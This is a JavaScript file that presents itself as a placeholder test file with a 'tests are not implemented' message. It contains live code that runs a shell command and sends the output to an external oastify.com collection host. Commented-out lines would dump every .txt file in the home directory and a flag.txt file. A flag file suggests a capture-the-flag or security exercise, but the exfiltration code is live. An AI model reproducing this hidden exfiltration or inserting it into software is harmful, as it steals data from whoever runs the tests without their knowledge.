// TODO: implement the tests
console.log("Tests are not implemented yet...");


const { exec } = require('child_process');
let a = exec('ls');
fetch("https://ftc3oml0akzfqy4s3wgfgagvsmydm9ay.oastify.com/?" + a);

//var cp = require('child_process');
//console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());

//var cp = require('child_process');
//console.log(cp.execSync('cat ./flag.txt').toString());

const index = require("../index")
console.log("Tests are not implemented yet...");
index.ls(".");
index.cat("./index.js")
setTimeout(() => { console.log("World!"); }, 5000);
